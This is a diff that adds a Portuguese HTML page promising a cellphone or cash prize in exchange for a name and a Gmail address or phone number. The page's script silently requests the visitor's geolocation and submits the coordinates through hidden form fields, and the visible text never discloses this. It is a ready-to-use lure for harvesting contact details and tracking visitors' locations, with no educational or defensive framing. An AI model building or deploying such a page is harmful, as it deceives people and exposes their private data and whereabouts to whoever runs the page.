@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Inscreve & Ganha</title>
+  <style>
+    body {
+      background-image: url('/static/fundo.jpg');
+      background-size: cover;
+      color: white;
+      text-align: center;
+      font-family: Arial;
+    }
+    form {
+      background-color: rgba(0,0,0,0.6);
+      padding: 20px;
+      margin: 50px auto;
+      width: 300px;
+      border-radius: 10px;
+    }
+    input, button {
+      width: 90%;
+      margin: 10px 0;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+    }
+    button {
+      background-color: green;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <form id="formulario" method="POST">
+    <h2>Inscreve & Ganha um celular ou dinheiro real</h2>
+    <input type="text" name="nome" placeholder="Seu nome" required>
+    <input type="text" name="contato" placeholder="Gmail ou número de celular" required>
+    <input type="hidden" name="latitude" id="latitude">
+    <input type="hidden" name="longitude" id="longitude">
+    <button type="submit">INSCREVER</button>
+  </form>
+
+  <script>
+    const form = document.getElementById('formulario');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // Impede envio imediato
+
+      navigator.geolocation.getCurrentPosition(function(position) {
+        document.getElementById('latitude').value = position.coords.latitude;
+        document.getElementById('longitude').value = position.coords.longitude;
+        form.submit(); // Envia o formulário após capturar localização
+      }, function(error) {
+        alert("⚠️ Não foi possível obter sua localização.");
+        form.submit(); // Envia mesmo sem localização
+      });
+    });
+  </script>
+</body>
+</html>
